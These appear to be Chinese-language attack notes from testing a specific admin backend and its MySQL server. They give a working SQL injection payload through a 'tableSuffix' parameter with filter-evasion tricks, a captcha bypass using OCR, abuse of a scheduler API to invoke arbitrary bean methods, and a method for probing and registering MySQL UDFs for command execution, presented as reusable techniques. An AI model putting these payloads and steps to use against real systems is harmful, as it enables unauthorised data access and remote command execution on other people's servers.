## 结论（已在 test1-admin/awt1 实测，2026-10-20）
1) 调度器 `mode` 列不是脚本/GLUE 分支：mode=1 → `com.invech.kitty[.modules].job.utils.SerialScheduleJob`（QRTZ_JOB_DETAILS.IS_NONCONCURRENT=1），其余值 → `ScheduleJob`（IS_NONCONCURRENT=0）。两者都是 getBean(beanName) + getDeclaredMethod(methodName,String.class).invoke，管理端 bundle 调度表单只有 beanName/methodName/params/cronExpression/remark/status，grep glueType/GLUE/groovy 命中 0；ScheduleJobEntity 只含 9 字段（无 script/glue）。save 时额外传 script/content/glueType/shellCommand/executorParam 会被丢弃（/sys/schedule/info 与 QRTZ JOB_DATA 序列化实体里均无）。
2) MySQL UDF 面：目标 8.0.40/Linux、root@%（Super/File/Insert/Create_user 全 Y）、plugin_dir=/usr/local/src/mysql-8.0.40-linux-glibc2.17-x86_64/lib/plugin/、secure_file_priv=NULL、log_output=TABLE、general_log=0。mysql.func/mysql.plugin 全空，15 个 sys_exec 家族 SONAME 全部注册失败（mysql.func 恒空）。

## 可复用判据/方法（重要）
- 判断「CREATE FUNCTION 通道是否被禁」的关键正控：`CREATE FUNCTION keyring_key_type_fetch RETURNS STRING SONAME 'keyring_udf.so'`（MySQL 发行包自带 keyring_udf.so）。注册成功 → 说明 plugin_dir 存在、账号有权限、通道可用，此时 sys_exec 家族注册失败就只可能是「目标机没有该 .so」，而不是被策略禁用。用完 DROP。
- 本地副作用 oracle：`insert into <db>.artx_l(line) values('<marker>')` 经 save+run，再用回显注入/独立查询读表，避免用异步 run 的 code 0 当执行判据。
- secure_file_priv=NULL 时 OUTFILE/DUMPFILE/LOAD_FILE 全禁，general_log 只能写文本，无法投放 ELF → UDF 需要「已存在 .so」或另找二进制写原语。
- 若拿到 MySQL 主机任意二进制写（共享目录、重启改 secure_file_priv、其它写原语），UDF 是现成的落地命令执行通道（本目标已验证注册机制可用）。

## 脚本要点
- 登录：/melody-admin/captcha.jpg?uuid= + ddddocr → POST /sys/login {username,password,uuid,captcha}；token 放 header `token`，IP 漂移会返回 code 10008，需重登重试。
- save：POST /sys/schedule/save {beanName,methodName,params,cronExpression,groupName,status,mode,remark}；jobId 用注入 select max(job_id) ... where remark=<hex> 取；run：POST /sys/schedule/run body=`[jobId]`（raw JSON 数组）。
- 回显注入：GET /melody-admin/pageconfig/pageconfig/getByConfigKey?configKey=admin_config&tableSuffix=001,(select (<expr>) as configValue)x#；表达式中出现 `> < %` 会 500，需改用 between / hex 字面量 / concat(0x25)。